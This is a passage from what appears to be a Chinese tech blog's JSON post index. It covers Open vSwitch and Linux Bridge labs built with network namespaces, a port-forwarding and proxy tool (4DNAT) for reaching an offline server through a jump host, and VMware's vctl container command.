10.0.0.2: icmp_seq=1 ttl=64 time=1.05 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.059 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.056 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.053 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3000ms rtt min/avg/max/mdev = 0.053/0.304/1.051/0.431 ms 测试ns0和ns2能否通信ip netns exec ns0 ping 10.0.0.3\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=1.17 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.067 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.058 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.064 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3001ms rtt min/avg/max/mdev = 0.058/0.341/1.177/0.482 ms 根据测试结果可以看到，三台设备都是可以互相访问的，这样我们就成功搭建了一个无隔离的二层互通网络。\n实验二： 单机隔离网络 使用ovs构建隔离网络也很简单，只需要给相应的端口设置上VLAN标签，就能实现网络的隔离。\n# 设置vnet0的VLAN tag为100 ovs-vsctl set Port vnet0 tag=100 # 设置vnet1和vnet2的VLAN tag为200 ovs-vsctl set Port vnet1 tag=200 ovs-vsctl set Port vnet2 tag=200 使用ovs-vsctl show命令查看VLAN tag是否配置成功\n90139c71-8d11-49b2-b44c-f34174259dc8 Bridge br-int Port \u0026#34;vnet0\u0026#34; tag: 100 Interface \u0026#34;vnet0\u0026#34; type: internal Port br-int Interface br-int type: internal Port \u0026#34;vnet2\u0026#34; tag: 200 Interface \u0026#34;vnet2\u0026#34; type: internal Port \u0026#34;vnet1\u0026#34; tag: 200 Interface \u0026#34;vnet1\u0026#34; type: internal ovs_version: \u0026#34;2.9.0\u0026#34; 测试\n测试ns0与ns1的能否通信 ip netns exec ns0 ping 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. ^C --- 10.0.0.2 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 1000ms 测试ns0与ns2的能否通信 ip netns exec ns0 ping 10.0.0.3\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. ^C --- 10.0.0.3 ping statistics --- 2 packets transmitted, 0 received, 100% packet loss, time 999ms 测试ns1与ns2的能否通信 ip netns exec ns1 ping 10.0.0.3\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.930 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.057 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.056 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.057 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3000ms rtt min/avg/max/mdev = 0.056/0.275/0.930/0.378 ms 测试ns2与ns1的能否通信 ip netns exec ns2 ping 10.0.0.2\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.088 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.057 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.050 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.060 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 2999ms rtt min/avg/max/mdev = 0.050/0.063/0.088/0.017 ms 根据测试结果可以看出，ns0是无法访问到ns1和ns2的，ns1和ns2可以互相访问。这是因为端口vnet0的数据报文发出后被OVS修改了包头，增加了VLAN 100标签，与vnet1、vnet2的VLAN 200标签不匹配，OVS交换机便不再将vnet0的数据报文发送给其他两个端口，由此便实现了网络隔离。\n清理实验环境\novs-vsctl del-br br-int ip netns del ns0 ip netns del ns1 ip netns del ns2 ","permalink":"https://typesafe.cn/posts/ovs-learn-2/","summary":"前言 在前面我们已经使用Linux Bridge完成了多台网络设备的通信，但是它对于网络隔离的支持不是很好，长期以来，在Linux平台上缺少一个功能完备的虚拟交换机，直到OVS的出现。\n实验 接下来我们来尝试完成两个实验，单机无隔离网络、单机隔离网络。\n实验一：单机无隔离网络 使用ovs构建无隔离网络非常简单，只需要添加一个网桥，然后在这个网桥上再增加几个内部端口，最后把端口移动到netns中即可。\n# 添加网桥 ovs-vsctl add-br br-int # 添加三个内部端口 ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type=internal ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type=internal # 添加三个netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 将内部端口分别移动到netns中 ip link set vnet0 netns ns0 ip link set vnet1 netns ns1 ip link set vnet2 netns ns2 # 启动端口并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set vnet0 up ip netns exec ns0 ip addr add 10.","title":"Open vSwitch 入门实践（2）使用OVS构建隔离网络"},{"content":"OVS简介 Open vSwitch 是什么？ Open vSwitch(以下简称OVS)是一个用C语言开发的多层虚拟交换机，使用Apcahe 2开源许可证，现如今基本上已经成为了开源SDN（软件定义网络）基础设施层的事实标准。\nOVS支持哪些功能？  支持NetFlow、sFlow(R)、IPFIX、SPAN、RSPAN和GRE隧道镜像等多种流量监控协议 支持LACP (IEEE 802.1AX-2008) 支持标准802.1Q VLAN协议，允许端口配置trunk模式 支持组播 支持BFD和802.1ag链路监控 支持STP（IEEE 802.1D-1998）和RSTP（IEEE 802.1D-2004） 支持细粒度的QoS（服务质量）配置 支持HFSC qdisc 支持接管每一个虚拟机的流量 支持基于源MAC的负载均衡、主备模式和L4哈希的端口绑带 支持OpenFlow协议（包含了很多对虚拟化的扩展） 支持IPv6 支持多种隧道协议（GRE、VXLAN、STT、Geneve和IPsec） 支持C和Python的远程配置协议 支持内核和用户空间的转发引擎选项 具有流缓存引擎的多表转发管道 转发层抽象以简化向新软件和硬件平台的移植  OVS的术语解释 Bridge 中文名称网桥，一个Bridge代表一个以太网交换机（Switch），一台主机中可以创建一个或多个Bridge，Bridge可以根据一定的规则，把某一个端口接收到的数据报文转发到另一个或多个端口上，也可以修改或者丢弃数据报文。\nPort 中文名称端口，需要注意的是它和TCP里面的端口不是同样的概念，它更像是物理交换机上面的插口，可以接水晶头的那种。Port隶属于Bridge，必须先添加了Bridge才能在Bridge上添加Port。Port有以下几种类型：\n  Normal\n用户可以把操作系统中已有的网卡添加到Open vSwicth上，Open vSwitct会自动生成一个同名的Port开处理这张网卡进和出的数据报文。\n 不过需要注意的是这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。此类型的Port常用于VLAN模式的多台物理主机相连的那个口，交换机一端属于Trunk模式。\n   Internal\n当Port的类型是Internal时，OVS会自动创建一个虚拟网卡（Interface），此端口收到的数据报文都会转发给这块网卡，从这块网卡发出的数据报文也会通过Port交给OVS处理。当OVS创建一个新的网桥时，会自动创建一个与网桥同名的Internal Port，同时也会创建一个与网桥同名的Interface，因此可以通过ip命令在操作系统中查看到这张虚拟网卡，但是状态是down的。\n  Patch\nPatch Port和veth pair功能相同，总是成双成对的出现，在其中一端收到的数据报文会被转发到另一个Patch Port上，就像是一根网线一样。Patch Port常用于连接两个Bridge，这样两个网桥就和一个网桥一样了。\n  Tunnel\nOVS 支持 GRE、VXLAN、STT、Geneve和IPsec隧道协议，这些隧道协议就是overlay网络的基础协议，通过对物理网络做的一层封装和扩展，解决了二层网络数量不足的问题，最大限度的减少对底层物理网络拓扑的依赖性，同时也最大限度的增加了对网络的控制。\n  Interface （iface/接口）接口是OVS与操作系统交换数据报文的组件，一个接口即是操作系统上的一块网卡，这个网卡可能是OVS生成的虚拟网卡，也有可能是挂载在OVS上的物理网卡，操作系统上的虚拟网卡（TUN/TAP）也可以被挂载在OVS上。\nController OpenFlow控制器，OVS可以接收一个或者多个OpenFlow控制器的管理，功能主要是下发流表，控制转发规则。\nFlow 流表是OVS进行数据转发的核心功能，定义了端口之间转发数据报文的规则，一条流表规则主要分为匹配和动作两部分，匹配部分决定哪些数据报文需要被处理，动作决定了匹配到的数据报文该如何处理。\nOVS常用操作 安装 yum install openvswitch systemctl enable openvswitch systemctl start openvswitch  如果当前软件源中没有openvswitch，可以通过阿里云官方镜像站下载和操作系统版本对应的rpm包到本地再安装。 示例命令： yum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm\n Bridge 操作 添加网桥\novs-vsctl add-br br-int 查询网桥列表\novs-vsctl list-br 删除网桥\novs-vsctl del-br br-int Port 操作  Normal Port  # 将物理网卡eth0添加到网桥br-int上 ovs-vsctl add-port br-int eth0 # 移除网桥br-int上的Port ovs-vsctl del-port br-int eth0  Internal Port  # 添加Internal Port  ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type=internal # 把网卡vnet0启动并配置IP ip link set vnet0 up ip addr add 192.168.0.1/24 dev vnet0 # 设置VLAN tag ovs-vsctl set Port vnet0 tag=100 # 移除vnet0上面的VLAN tag配置 ovs-vsctl remove Port vnet0 tag 100 # 设置vnet0允许通过的VLAN tag ovs-vsctl set Port vnet0 trunks=100,200 # 移除vnet0允许通过的的VLAN tag配置 ovs-vsctl remove Port vnet0 trunks 100,200  Patch Port  ovs-vsctl add-br br0 ovs-vsctl add-br br1 ovs-vsctl \\ -- add-port br0 patch0 -- set interface patch0 type=patch options:peer=patch1 \\ -- add-port br1 patch1 -- set interface patch1 type=patch options:peer=patch0  Tunnel Port  #主机10.1.7.21上 ovs-vsctl add-br br-tun ovs-vsctl add-port br-tun vxlan-vx01 -- set Interface vxlan-vx01 type=vxlan options:remote_ip=10.1.7.22 options:key=flow ovs-vsctl add-port br-tun vxlan-vx02 -- set Interface vxlan-vx02 type=vxlan options:remote_ip=10.1.7.23 options:key=flow #主机10.1.7.22上 ovs-vsctl add-br br-tun ovs-vsctl add-port br-tun vxlan-vx01 -- set Interface vxlan-vx01 type=vxlan options:remote_ip=10.1.7.21 options:key=flow ovs-vsctl add-port br-tun vxlan-vx02 -- set Interface vxlan-vx02 type=vxlan options:remote_ip=10.1.7.23 options:key=flow #主机10.1.7.23上 ovs-vsctl add-br br-tun ovs-vsctl add-port br-tun vxlan-vx01 -- set Interface vxlan-vx01 type=vxlan options:remote_ip=10.1.7.21 options:key=flow ovs-vsctl add-port br-tun vxlan-vx02 -- set Interface vxlan-vx02 type=vxlan options:remote_ip=10.1.7.22 options:key=flow  其他基本操作  # 设置VLAN mode ovs-vsctl set port \u0026lt;port name\u0026gt; VLAN_mode=trunk|access|native-tagged|native-untagged # 设置VLAN tag ovs-vsctl set port \u0026lt;port name\u0026gt; tag=\u0026lt;1-4095\u0026gt; # 设置VLAN trunk ovs-vsctl set port \u0026lt;port name\u0026gt; trunk=100,200 # 移除Port的属性 ovs-vsctl remove port \u0026lt;port name\u0026gt; \u0026lt;property name\u0026gt; \u0026lt;property value\u0026gt; # 查看Port的属性 ovs-vsctl list interface \u0026lt;port name\u0026gt; 接下来我们将使用OVS来实现单机和多台物理服务器下的虚拟VLAN网络。\n","permalink":"https://typesafe.cn/posts/ovs-learn-1/","summary":"OVS简介 Open vSwitch 是什么？ Open vSwitch(以下简称OVS)是一个用C语言开发的多层虚拟交换机，使用Apcahe 2开源许可证，现如今基本上已经成为了开源SDN（软件定义网络）基础设施层的事实标准。\nOVS支持哪些功能？  支持NetFlow、sFlow(R)、IPFIX、SPAN、RSPAN和GRE隧道镜像等多种流量监控协议 支持LACP (IEEE 802.1AX-2008) 支持标准802.1Q VLAN协议，允许端口配置trunk模式 支持组播 支持BFD和802.1ag链路监控 支持STP（IEEE 802.1D-1998）和RSTP（IEEE 802.1D-2004） 支持细粒度的QoS（服务质量）配置 支持HFSC qdisc 支持接管每一个虚拟机的流量 支持基于源MAC的负载均衡、主备模式和L4哈希的端口绑带 支持OpenFlow协议（包含了很多对虚拟化的扩展） 支持IPv6 支持多种隧道协议（GRE、VXLAN、STT、Geneve和IPsec） 支持C和Python的远程配置协议 支持内核和用户空间的转发引擎选项 具有流缓存引擎的多表转发管道 转发层抽象以简化向新软件和硬件平台的移植  OVS的术语解释 Bridge 中文名称网桥，一个Bridge代表一个以太网交换机（Switch），一台主机中可以创建一个或多个Bridge，Bridge可以根据一定的规则，把某一个端口接收到的数据报文转发到另一个或多个端口上，也可以修改或者丢弃数据报文。\nPort 中文名称端口，需要注意的是它和TCP里面的端口不是同样的概念，它更像是物理交换机上面的插口，可以接水晶头的那种。Port隶属于Bridge，必须先添加了Bridge才能在Bridge上添加Port。Port有以下几种类型：\n  Normal\n用户可以把操作系统中已有的网卡添加到Open vSwicth上，Open vSwitct会自动生成一个同名的Port开处理这张网卡进和出的数据报文。\n 不过需要注意的是这种方式添加的Port不支持分配IP地址，如果之前网卡上配置的有IP，挂载到OVS上面之后将不可访问。此类型的Port常用于VLAN模式的多台物理主机相连的那个口，交换机一端属于Trunk模式。\n   Internal\n当Port的类型是Internal时，OVS会自动创建一个虚拟网卡（Interface），此端口收到的数据报文都会转发给这块网卡，从这块网卡发出的数据报文也会通过Port交给OVS处理。当OVS创建一个新的网桥时，会自动创建一个与网桥同名的Internal Port，同时也会创建一个与网桥同名的Interface，因此可以通过ip命令在操作系统中查看到这张虚拟网卡，但是状态是down的。\n  Patch\nPatch Port和veth pair功能相同，总是成双成对的出现，在其中一端收到的数据报文会被转发到另一个Patch Port上，就像是一根网线一样。Patch Port常用于连接两个Bridge，这样两个网桥就和一个网桥一样了。\n  Tunnel\nOVS 支持 GRE、VXLAN、STT、Geneve和IPsec隧道协议，这些隧道协议就是overlay网络的基础协议，通过对物理网络做的一层封装和扩展，解决了二层网络数量不足的问题，最大限度的减少对底层物理网络拓扑的依赖性，同时也最大限度的增加了对网络的控制。\n  Interface （iface/接口）接口是OVS与操作系统交换数据报文的组件，一个接口即是操作系统上的一块网卡，这个网卡可能是OVS生成的虚拟网卡，也有可能是挂载在OVS上的物理网卡，操作系统上的虚拟网卡（TUN/TAP）也可以被挂载在OVS上。","title":"Open vSwitch 入门实践（1）Open vSwitch 是什么"},{"content":"前言 你是否遇到过这样的场景，服务器不能上网，但是又需要安装某个软件，面对如蛛网般杂乱的rpm包依赖关系，放弃或许是最好的选择，这样你就不必再为无法完成工作而痛苦又懊恼。\n但是今天，你有了一个更好的选择。\n4DNAT 4DNAT取名源自4和DNAT。这个工具工作在OSI模型的第四层传输层，同时4和for谐音，意为专门为目标地址转换而服务的工具。4DNAT使用go语言开发，具有天然的跨平台性，并且完全使用go标准库开发，没有任何的第三方依赖，编译之后只有一个二进制可执行文件。它有4种工作模式：\n转发模式 接受两个参数，监听端口和目标地址，在监听端口接收到请求后会主动连接目标地址，示例：\n./4dnat -forward 2222 192.168.1.100:22 监听模式 接受两个参数，监听端口1和监听端口2，并交换两个端口接收到的数据，示例：\n./4dnat -listen 10000 10001 代理人模式 接受两个参数，目标地址1和目标地址2，启动后会主动连接这两个目标地址，并交换两个端口接收到的数据，示例：\n./4dnat -agent 127.0.0.1:10000 127.0.0.1:22 http/https代理模式 接受两个参数或四个参数，代理类型、监听端口、证书路径和私钥路径，示例：\nhttp代理 ./4dnat -proxy http 1080 https代理 ./4dnat -proxy https 1080 server.crt server.key 使用场景 场景一 期望可以在用户电脑上直接访问目标服务器上的3306端口，跳板机器是一台Windows机器，没办法做ssh端口转发。  单向虚线箭头表示可以单向访问，反之不行。\n 使用4DNAT在跳板机器上执行如下命令做端口转发\n# 本地监听3307端口，接收到请求后主动连接10.1.0.40的3306端口 ./4dnat -forward 3307 10.1.0.40:3306 在用户电脑上访问172.16.0.30:3307即等同于访问10.1.0.40:3306，于是就可以在用户电脑愉快的访问目标机器上的服务啦。\n场景二 期望目标目标机器可以上网，如使用yum安装软件。  在用户电脑上开启一个http代理  ./4dnat -proxy http 1080 在跳板机器上使用监听模式监听两个端口，用于交换数据  ./4dnat -listen 10000 10001 在目标机器上使用监听模式监听两个端口，用于交换数据  ./4dnat -listen 20000 20001 在用户电脑上使用代理人模式主动连接两个目标地址，用于交换数据  ./4dnat -agent 127.0.0.1:1080 172.16.0.30:10000 在跳板机器上使用代理人模式主动连接两个目标地址，用于交换数据  ./4dnat -agent 127.0.0.1:10001 10.1.0.40:20000 在目标机器上修改代理  cat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; /etc/profile http_proxy=http://127.0.0.1:20001 https_proxy=http://127.0.0.1:20001 export http_proxy https_proxy EOF source /etc/profile 在目标机器上测试访问互联网  curl https://typesafe.cn 最后奉上项目地址 https://github.com/dushixiang/4dnat\n","permalink":"https://typesafe.cn/posts/4dnat/","summary":"前言 你是否遇到过这样的场景，服务器不能上网，但是又需要安装某个软件，面对如蛛网般杂乱的rpm包依赖关系，放弃或许是最好的选择，这样你就不必再为无法完成工作而痛苦又懊恼。\n但是今天，你有了一个更好的选择。\n4DNAT 4DNAT取名源自4和DNAT。这个工具工作在OSI模型的第四层传输层，同时4和for谐音，意为专门为目标地址转换而服务的工具。4DNAT使用go语言开发，具有天然的跨平台性，并且完全使用go标准库开发，没有任何的第三方依赖，编译之后只有一个二进制可执行文件。它有4种工作模式：\n转发模式 接受两个参数，监听端口和目标地址，在监听端口接收到请求后会主动连接目标地址，示例：\n./4dnat -forward 2222 192.168.1.100:22 监听模式 接受两个参数，监听端口1和监听端口2，并交换两个端口接收到的数据，示例：\n./4dnat -listen 10000 10001 代理人模式 接受两个参数，目标地址1和目标地址2，启动后会主动连接这两个目标地址，并交换两个端口接收到的数据，示例：\n./4dnat -agent 127.0.0.1:10000 127.0.0.1:22 http/https代理模式 接受两个参数或四个参数，代理类型、监听端口、证书路径和私钥路径，示例：\nhttp代理 ./4dnat -proxy http 1080 https代理 ./4dnat -proxy https 1080 server.crt server.key 使用场景 场景一 期望可以在用户电脑上直接访问目标服务器上的3306端口，跳板机器是一台Windows机器，没办法做ssh端口转发。  单向虚线箭头表示可以单向访问，反之不行。\n 使用4DNAT在跳板机器上执行如下命令做端口转发\n# 本地监听3307端口，接收到请求后主动连接10.1.0.40的3306端口 ./4dnat -forward 3307 10.1.0.40:3306 在用户电脑上访问172.16.0.30:3307即等同于访问10.1.0.40:3306，于是就可以在用户电脑愉快的访问目标机器上的服务啦。\n场景二 期望目标目标机器可以上网，如使用yum安装软件。  在用户电脑上开启一个http代理  ./4dnat -proxy http 1080 在跳板机器上使用监听模式监听两个端口，用于交换数据  ./4dnat -listen 10000 10001 在目标机器上使用监听模式监听两个端口，用于交换数据  ./4dnat -listen 20000 20001 在用户电脑上使用代理人模式主动连接两个目标地址，用于交换数据  .","title":"服务器不允许上网并且需要跳板机才能访问？学会使用这个工具，轻松让服务器使用yum。"},{"content":"前言 作为一个称职的打工人，电脑上常备一个Vmware不是什么新鲜事了，但是它和Docker for Windows不兼容往往很让人头大。通过查找资料，发现提供的解决方案大致有三种\n 先使用Vmware创建一台Linux虚拟机，在这台Linux虚拟机上再安装docker。 配置Vmware作为Docker for Windows的运行平台。 使用微软的Hyper-v来创建虚拟机。  对我而言，第一种不太优雅，第二种配置繁琐，第三种不会用。\n直到我发现了vctl这个好东西。\nvctl 是什么？  vctl 是一款捆绑在Vmware Workstation Pro 应用程序中的命令行实用程序，仅在 Windows 10 1809 或更高版本上受支持。如果 Workstation Pro 所在主机上的 Windows 操作系统低于 Windows 10 1809，则它不支持 vctl CLI。\n 简单来说它就是Vmware上的一个工具，可以用它来管理容器，使用命令基本上和docker一致，只需要把docker \u0026lt;cmd\u0026gt;换成vctl \u0026lt;cmd\u0026gt;就足够了。Docker for Windows？不需要。现在容器都交给vctl来管理了。\n在使用vctl命令前，和启动docker一样，需要先启动vctl的守护进程。\nvctl system start 当需要关闭守护进程时执行\nvctl system stop 接下来就是和普通的docker命令一样了。\n# 拉取镜像 vctl pull nginx # 查看镜像 vctl images # 启动容器 vctl --name some-nginx -d -p 8080:80 nginx # 查看容器 vctl ps # 进入容器 vctl exec -it \u0026lt;cid\u0026gt; bash 更多使用信息可参考Vmware的官方文档 使用vctl命令管理容器\n","permalink":"https://typesafe.cn/posts/vctl/","summary":"前言 作为一个称职的打工人，电脑上常备一个Vmware不是什么新鲜事了，但是它和Docker for Windows不兼容往往很让人头大。通过查找资料，发现提供的解决方案大致有三种\n 先使用Vmware创建一台Linux虚拟机，在这台Linux虚拟机上再安装docker。 配置Vmware作为Docker for Windows的运行平台。 使用微软的Hyper-v来创建虚拟机。  对我而言，第一种不太优雅，第二种配置繁琐，第三种不会用。\n直到我发现了vctl这个好东西。\nvctl 是什么？  vctl 是一款捆绑在Vmware Workstation Pro 应用程序中的命令行实用程序，仅在 Windows 10 1809 或更高版本上受支持。如果 Workstation Pro 所在主机上的 Windows 操作系统低于 Windows 10 1809，则它不支持 vctl CLI。\n 简单来说它就是Vmware上的一个工具，可以用它来管理容器，使用命令基本上和docker一致，只需要把docker \u0026lt;cmd\u0026gt;换成vctl \u0026lt;cmd\u0026gt;就足够了。Docker for Windows？不需要。现在容器都交给vctl来管理了。\n在使用vctl命令前，和启动docker一样，需要先启动vctl的守护进程。\nvctl system start 当需要关闭守护进程时执行\nvctl system stop 接下来就是和普通的docker命令一样了。\n# 拉取镜像 vctl pull nginx # 查看镜像 vctl images # 启动容器 vctl --name some-nginx -d -p 8080:80 nginx # 查看容器 vctl ps # 进入容器 vctl exec -it \u0026lt;cid\u0026gt; bash 更多使用信息可参考Vmware的官方文档 使用vctl命令管理容器","title":"Docker？Vmware？小孩子才做选择，打工人我全都要。"},{"content":"Linux Bridge 详解 Linux Bridge（网桥）是用纯软件实现的虚拟交换机，有着和物理交换机相同的功能，例如二层交换，MAC地址学习等。因此我们可以把tun/tap，veth pair等设备绑定到网桥上，就像是把设备连接到物理交换机上一样。此外它和veth pair、tun/tap一样，也是一种虚拟网络设备，具有虚拟设备的所有特性，例如配置IP，MAC地址等。\nLinux Bridge通常是搭配KVM、docker等虚拟化技术一起使用的，用于构建虚拟网络，因为此教程不涉及虚拟化技术，我们就使用前面学习过的netns来模拟虚拟设备。\n如何使用Linux Bridge？ 操作网桥有多种方式，在这里我们介绍一下通过bridge-utils来操作，由于它不是Linux系统自带的工具，因此需要我们手动来安装它。\n# centos yum install -y bridge-utils # ubuntu apt-get install -y bridge-utils 使用brctl help查看使用帮助\nnever heard of command [help] Usage: brctl [commands] commands: addbr \u0026lt;bridge\u0026gt;\tadd bridge delbr \u0026lt;bridge\u0026gt;\tdelete bridge addif \u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tadd interface to bridge delif \u0026lt;bridge\u0026gt; \u0026lt;device\u0026gt;\tdelete interface from bridge hairpin \u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; {on|off}\tturn hairpin on/off setageing \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset ageing time setbridgeprio\t\u0026lt;bridge\u0026gt; \u0026lt;prio\u0026gt;\tset bridge priority setfd \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset bridge forward delay sethello \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset hello time setmaxage \u0026lt;bridge\u0026gt; \u0026lt;time\u0026gt;\tset max message age setpathcost\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;cost\u0026gt;\tset path cost setportprio\t\u0026lt;bridge\u0026gt; \u0026lt;port\u0026gt; \u0026lt;prio\u0026gt;\tset port priority show [ \u0026lt;bridge\u0026gt; ]\tshow a list of bridges showmacs \u0026lt;bridge\u0026gt;\tshow a list of mac addrs showstp \u0026lt;bridge\u0026gt;\tshow bridge stp info stp \u0026lt;bridge\u0026gt; {on|off}\tturn stp on/off 常用命令如\n新建一个网桥：\nbrctl addbr \u0026lt;bridge\u0026gt; 添加一个设备（例如eth0）到网桥：\nbrctl addif \u0026lt;bridge\u0026gt; eth0 显示当前存在的网桥及其所连接的网络端口：\nbrctl show 启动网桥：\nip link set \u0026lt;bridge\u0026gt; up 删除网桥，需要先关闭它：\nip link set \u0026lt;bridge\u0026gt; down brctl delbr \u0026lt;bridge\u0026gt; 或者使用ip link del 命令直接删除网桥\nip link del \u0026lt;bridge\u0026gt;  增加Linux Bridge时会自动增加一个同名虚拟网卡在宿主机器上，因此我们可以通过ip link命令操作这个虚拟网卡，实际上也就是操作网桥，并且只有当这个虚拟网卡状态处于up的时候，网桥才会转发数据。\n 实验 在上一节《Linux veth pair详解》我们使用veth pair将两个隔离的netns连接在了一起，在现实世界里等同于用一根网线把两台电脑连接在了一起，但是在现实世界里往往很少会有人这样使用。因为一台设备不仅仅只需要和另一台设备通信，它需要和很多很多的网络设备进行通信，如果还使用这样的方式，需要十分复杂的网络接线，并且现实世界中的普通网络设备也没有那么多网络接口。\n那么，想要让某一台设备和很多网络设备都可以通信需要如何去做呢？在我们的日常生活中，除了手机和电脑，最常见的网络设备就是路由器了，我们的手机连上WI-FI，电脑插到路由器上，等待从路由器的DHCP服务器上获取到IP，他们就可以相互通信了，这便是路由器的二层交换功能在工作。Linux Bridge最主要的功能就是二层交换，是对现实世界二层交换机的模拟，我们稍微改动一下网络拓扑，如下图：\n我们建立了一个网桥，三个netns，三对veth pair，分别一端在netns中，另一端连接在网桥上，为了简化拓扑，我去除了netns中的tap设备，将IP直接配置在veth上。\n veth设备不仅仅可以可以充当“网线”，同时它也可以当作虚拟网卡来使用。\n # 添加网桥 brctl addbr br0 # 启动网桥 ip link set br0 up # 新增三个netns ip netns add ns0 ip netns add ns1 ip netns add ns2 # 新增两对veth ip link add veth0-ns type veth peer name veth0-br ip link add veth1-ns type veth peer name veth1-br ip link add veth2-ns type veth peer name veth2-br # 将veth的一端移动到netns中 ip link set veth0-ns netns ns0 ip link set veth1-ns netns ns1 ip link set veth2-ns netns ns2 # 将netns中的本地环回和veth启动并配置IP ip netns exec ns0 ip link set lo up ip netns exec ns0 ip link set veth0-ns up ip netns exec ns0 ip addr add 10.0.0.1/24 dev veth0-ns ip netns exec ns1 ip link set lo up ip netns exec ns1 ip link set veth1-ns up ip netns exec ns1 ip addr add 10.0.0.2/24 dev veth1-ns ip netns exec ns2 ip link set lo up ip netns exec ns2 ip link set veth2-ns up ip netns exec ns2 ip addr add 10.0.0.3/24 dev veth2-ns # 将veth的另一端启动并挂载到网桥上 ip link set veth0-br up ip link set veth1-br up ip link set veth2-br up brctl addif br0 veth0-br brctl addif br0 veth1-br brctl addif br0 veth2-br 测试网络连通性\n使用ip netns exec ns0 ping 10.0.0.2在命名空间ns0中测试与ns1的10.0.0.2的网络连通性\nPING 10.0.0.2 (10.0.0.2) 56(84) bytes of data. 64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.032 ms 64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.058 ms 64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.052 ms 64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.044 ms ^C --- 10.0.0.2 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 54ms rtt min/avg/max/mdev = 0.032/0.046/0.058/0.011 ms 使用ip netns exec ns0 ping 10.0.0.3在命名空间ns0中测试与ns2的10.0.0.3的网络连通性\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.054 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.045 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.058 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.064 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 81ms rtt min/avg/max/mdev = 0.045/0.055/0.064/0.008 ms 使用ip netns exec ns1 ping 10.0.0.1在命名空间ns1中测试与ns0的10.0.0.1的网络连通性\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.046 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.041 ms ^C --- 10.0.0.1 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 81ms rtt min/avg/max/mdev = 0.031/0.039/0.046/0.005 ms 使用ip netns exec ns1 ping 10.0.0.3在命名空间ns1中测试与ns2的10.0.0.3的网络连通性\nPING 10.0.0.3 (10.0.0.3) 56(84) bytes of data. 64 bytes from 10.0.0.3: icmp_seq=1 ttl=64 time=0.060 ms 64 bytes from 10.0.0.3: icmp_seq=2 ttl=64 time=0.059 ms 64 bytes from 10.0.0.3: icmp_seq=3 ttl=64 time=0.044 ms 64 bytes from 10.0.0.3: icmp_seq=4 ttl=64 time=0.065 ms ^C --- 10.0.0.3 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 65ms rtt min/avg/max/mdev = 0.044/0.057/0.065/0.007 ms 使用ip netns exec ns2 ping 10.0.0.1在命名空间ns2中测试与ns0的10.0.0.1的网络连通性\nPING 10.0.0.1 (10.0.0.1) 56(84) bytes of data. 64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms 64 bytes from 10.0.0.1: icmp_seq=2 ttl=64 time=0.056 ms 64 bytes from 10.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms 64 bytes from 10.0.0.1: icmp_seq=4 ttl=64 time=0.060 ms ^C --- 